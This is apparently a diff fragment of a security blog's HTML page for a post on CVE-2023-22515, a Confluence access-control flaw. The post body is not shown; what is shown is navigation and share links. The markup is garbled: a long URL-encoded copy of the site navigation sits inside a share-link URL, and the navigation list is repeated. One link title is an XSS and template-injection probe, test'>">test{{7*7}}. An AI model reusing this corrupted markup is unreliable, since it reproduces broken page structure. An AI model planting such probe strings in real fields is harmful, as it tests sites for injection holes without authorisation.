%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fCTF%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbountycon2020%22%3eBountyCon%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbountycon2020%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fh1-2006-ctf%22%3eH1-2006-CTF%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fh1-2006-ctf%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fhack-lu%22%3eHack.lu%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2fhack-lu%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2ffacebook-ctf19-writeup%22%3eFacebook%20CTF%2719%20writeup%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2ffacebook-ctf19-writeup%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fcsaw19-ctf%22%3eCSAW%2719%20CTF%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fcsaw19-ctf%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2ftangled_browsers%22%3etangled_browsers%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2ftangled_browsers%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbytebandits-ctf-2020%22%3eByteBandits%20CTF%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbytebandits-ctf-2020%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fIuseBing%22%3eGoogle%20CTF%20-%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fIuseBing%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fzer0ptsctf2021-challenges%22%3ezer0ptsCTF2021-challenges%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2fzer0ptsctf2021-challenges%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fsite-isolation%22%3esite-isolation%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fsite-isolation%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbsidesahm2021%22%3eBsidesAHM2021%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbsidesahm2021%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUncgRldHaklkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkhJSDJWIiBmb2N1c2FibGU9ImZhbHNlIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg5LjcsMTIpIHJvdGF0ZSg0NSkiPjxwYXRoIGNsYXNzPSJLNEI4WSIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQuMywxMikgcm90YXRlKC00NSkiPjxwYXRoIGNsYXNzPSJNcllNeCIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.dvmRw%0a.FWGjId%7d%0a%3ca%20href%3d%22%2fresearch%22%3eResearch%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3btrue%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fresearch%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fcookie-tossing-to-rce-on-google-cloud-jupyter-notebooks%22%3eCookie%20Tossing%20to%20RCE%20on%20Google%20Cloud%20Jupyter%0aNotebooks%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2fcookie-tossing-to-rce-on-google-cloud-jupyter-notebooks%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2ftesttest77%22%3etest%27%26gt%3b%26quot%3b%26gt%3btest%7b%7b7%2a7%7d%7d%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2ftesttest77%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fPP%22%3ePrototype%20Pollution%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2fPP%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fbrokenconflu%22%3eBrokenConflu%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aaria-selected%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fresearch%2fbrokenconflu%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fabout-me%22%3eAbout%20Me%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fabout-me%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fabout-me%2fLooking-Back-Looking-Forward%22%3eLooking%20Back%20Looking%20Forward%3a%0a2021%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fabout-me%2fLooking-Back-Looking-Forward%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2finspiration%22%3eInspiration%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2finspiration%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3e%3ca%20href%3d%22%2fhome%22%3e%3cimg%20src%3d%22https%3a%2f%2flh5.googleusercontent.com%2f-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A%3dw16383%22%20alt%3d%22%22%3e%7b.lzy1Td%0arole%3d%26ldquo%3bimg%26rdquo%3b%20aria-label%3d%26ldquo%3bSite%20home%26rdquo%3b%20jsname%3d%26ldquo%3bSwcDWb%26rdquo%3b%7ds1r1us%3c%2fa%3e%7b.GAuSPc%0ajsname%3d%26ldquo%3bjIujaf%26rdquo%3b%7d%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&t=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#h.n671hbs3m557">CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-11-03 14:09:13 &#43;0530 IST" itemprop="datePublished">2024-11-03</time>
+          
+        </div>
+        
+         | 
+        <a class="a" href="/">Home</a>
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8+PHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg==" alt="">{.V4YR2c}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0idnU4UHdlIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xNS41IDE0aC0uNzlsLS4yOC0uMjdDMTUuNDEgMTIuNTkgMTYgMTEuMTEgMTYgOS41IDE2IDUuOTEgMTMuMDkgMyA5LjUgM1MzIDUuOTEgMyA5LjUgNS45MSAxNiA5LjUgMTZjMS42MSAwIDMuMDktLjU5IDQuMjMtMS41N2wuMjcuMjh2Ljc5bDUgNC45OUwyMC40OSAxOWwtNC45OS01em0tNiAwQzcuMDEgMTQgNSAxMS45OSA1IDkuNVM3LjAxIDUgOS41IDUgMTQgNy4wMSAxNCA5LjUgMTEuOTkgMTQgOS41IDE0eiIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg==" alt="">{.vu8Pwe}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8+PHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg==" alt="">{.V4YR2c}</p>
+<p>Search this site</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZkFVRVVkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xOSA2LjQxTDE3LjU5IDUgMTIgMTAuNTkgNi40MSA1IDUgNi40MSAxMC41OSAxMiA1IDE3LjU5IDYuNDEgMTkgMTIgMTMuNDEgMTcuNTkgMTkgMTkgMTcuNTkgMTMuNDEgMTJ6IiAvPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8+PC9zdmc+" alt="">{.fAUEUd}</p>
+<p>Skip to main content</p>
+<p>Skip to navigation</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0id0ZDV25lIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkIxbjl1YiIgZm9jdXNhYmxlPSJmYWxzZSI+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIsMTIpIj48cGF0aCBjbGFzcz0iaGxKSDAiIGQ9Ik0tOSAtNSBMOSAtNSIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJIQnU2TiIgZD0iTS05IDAgTDkgMCIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJjTEFHUWUiIGQ9Ik0tOSA1IEw5IDUiIGZpbGw9Im5vbmUiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c+PC9zdmc+" alt="">{.wFCWne}</p>
+<p><a href="/home"><img src="https://lh5.googleusercontent.com/-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A=w16383" alt="">{.r9CsCb
+role=&ldquo;img&rdquo;
+aria-label=&ldquo;Site home&rdquo;}</a>{.XMyrgf}<a href="/home">s1r1us</a>{.Zjiec .oNsfjf}</p>
+<ul>
+<li><a href="/home">Home</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/home&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;1&rdquo;}</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<a href="/questions">Questions</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+aria-expanded=&ldquo;false&rdquo; aria-haspopup=&ldquo;true&rdquo; url=&quot;/questions&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<ul>
+<li><a href="/questions/why-much-of-science-progress-happened-in-west">why much of science progress happened in
+west?</a>{.aJHbb
+.hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo;
+url=&quot;/questions/why-much-of-science-progress-happened-in-west&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/questions/my-curse-of-curiosity-and-the-problem-of-choice">my curse of curiosity and the problem of
+choice</a>{.aJHbb
+.hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo;
+url=&quot;/questions/my-curse-of-curiosity-and-the-problem-of-choice&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/books">Books</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/books&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;1&rdquo;}</li>
+<li><a href="/advisories">Advisories</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/advisories&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<a href="/CTF">CTF</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/CTF&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<ul>
+<li><a href="/CTF/bountycon2020">BountyCon 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bountycon2020&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/h1-2006-ctf">H1-2006-CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/h1-2006-ctf&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/hack-lu">Hack.lu</a>{.aJHbb .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/hack-lu&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/facebook-ctf19-writeup">Facebook CTF'19 writeup</a>{.aJHbb
+.hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/CTF/facebook-ctf19-writeup&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/csaw19-ctf">CSAW'19 CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/csaw19-ctf&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/tangled_browsers">tangled_browsers</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/tangled_browsers&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/bytebandits-ctf-2020">ByteBandits CTF 2020</a>{.aJHbb .hDrhEe
+.HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bytebandits-ctf-2020&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/IuseBing">Google CTF - 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/IuseBing&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/zer0ptsctf2021-challenges">zer0ptsCTF2021-challenges</a>{.aJHbb
+.hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/CTF/zer0ptsctf2021-challenges&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/site-isolation">site-isolation</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/site-isolation&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/bsidesahm2021">BsidesAHM2021</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bsidesahm2021&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
